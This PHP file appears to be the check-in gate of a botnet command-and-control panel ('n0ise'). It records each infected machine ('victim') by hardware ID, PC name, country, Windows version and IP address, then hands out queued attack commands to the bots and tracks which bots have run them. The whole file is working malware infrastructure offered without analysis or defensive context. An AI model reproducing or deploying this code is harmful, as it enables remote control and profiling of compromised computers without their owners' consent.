<?php

include("_bot/run.php");

if(isset($_POST['hwid'])) {
	$query = $_n0ise->query("
	SELECT 
	(
		SELECT t.taskID
		FROM n0ise_tasks AS t
		WHERE t.time <= '".time()."' AND ((
			t.elapsed > '".time()."' AND
			(SELECT count(*) FROM n0ise_victims WHERE taskID=t.taskID AND ConTime >".(time()-$_n0ise->online).")<=bots
		) OR (t.elapsed=0 AND (
			SELECT count(*)
			FROM n0ise_task_done
			WHERE taskID=t.taskID
		)<bots AND (
			SELECT count(*)
			FROM n0ise_task_done
			WHERE taskID=t.taskID AND vicID=v.ID
		)=0))
		ORDER BY t.elapsed
		LIMIT 0,1
	) AS taskID,ID
	FROM n0ise_victims AS v
	WHERE v.HWID='".mysql_escape_string($_POST['hwid'])."'");

	if(!mysql_num_rows($query)) {
		if(isset($_POST['pcname']) && isset($_POST['country']) && isset($_POST['winver']) && isset($_POST['hwid'])) $_n0ise->query("INSERT INTO n0ise_victims (`ID`, `PCName`, `BotVersion`, `InstTime`, `ConTime`, `Country`, `WinVersion`, `HWID`, `IP`) VALUES (NULL, '".mysql_escape_string($_POST['pcname'])."', '".mysql_escape_string($_POST['botver'])."', '".time()."', '".time()."', '".mysql_escape_string($_POST['country'])."', '".mysql_escape_string($_POST['winver'])."', '".mysql_escape_string($_POST['hwid'])."', '".$_SERVER['REMOTE_ADDR']."')");
		die();
	} else {
		$ds = mysql_fetch_array($query);
		$task = mysql_fetch_array($_n0ise->query("SELECT elapsed,command FROM n0ise_tasks WHERE taskID='".$ds['taskID']."'"));
		$_n0ise->query("UPDATE `n0ise_victims` SET `ConTime` = '".time()."', IP='".$_SERVER['REMOTE_ADDR']."', taskID='".($task['elapsed'] ? $ds['taskID'] : 0)."', BotVersion='".mysql_escape_string($_POST['botver'])."' WHERE ID='".$ds['ID']."'");
		if(!$task['elapsed']) $_n0ise->query("INSERT INTO n0ise_task_done VALUES ('".$ds['taskID']."', '".$ds['ID']."')");
		die($task['command']);
	}
	
}
?>